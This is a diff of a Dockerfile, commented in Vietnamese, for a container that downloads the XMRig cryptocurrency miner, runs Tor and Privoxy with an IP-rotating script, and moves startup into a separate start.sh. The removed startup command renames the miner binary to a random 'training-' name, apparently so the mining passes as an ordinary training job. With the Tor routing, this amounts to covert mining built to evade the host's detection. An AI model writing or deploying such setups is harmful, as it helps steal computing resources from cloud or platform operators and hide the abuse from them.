@@ -30,18 +30,14 @@ RUN wget https://github.com/xmrig/xmrig/releases/download/v${VERSION}/xmrig-${VE
 COPY config /etc/privoxy/config
 COPY torrc /etc/tor/torrc
 
-# Sao chép script đổi IP vào container
+# Sao chép script đổi IP và script khởi động vào container
 COPY change_ip.sh /root/change_ip.sh
+COPY start.sh /root/start.sh
 
-# Cấp quyền cho cấu hình Tor và Privoxy
-RUN chmod 644 /etc/tor/torrc && chmod 644 /etc/privoxy/config && chmod +x /root/change_ip.sh
+# Cấp quyền cho các script và cấu hình Tor và Privoxy
+RUN chmod 644 /etc/tor/torrc && chmod 644 /etc/privoxy/config \
+    && chmod +x /root/change_ip.sh \
+    && chmod +x /root/start.sh
 
-# Khởi động dịch vụ Tor và Privoxy và chạy script đổi IP trực tiếp
-CMD service tor start && service privoxy start && \
-    if [ ! -f /root/xmrig_name.txt ]; then \
-        RANDOM_NAME=$(echo training-$(shuf -i 1-375 -n 1)-$(shuf -i 1-259 -n 1)); \
-        mv $WORK_DIR/xmrig-${VERSION}/xmrig $WORK_DIR/$RANDOM_NAME; \
-        chmod +x $WORK_DIR/$RANDOM_NAME; \
-        echo $RANDOM_NAME > /root/xmrig_name.txt; \
-    fi && \
-    /root/change_ip.sh
+# Khởi động dịch vụ Tor, Privoxy và chạy script khởi động
+CMD /root/start.sh
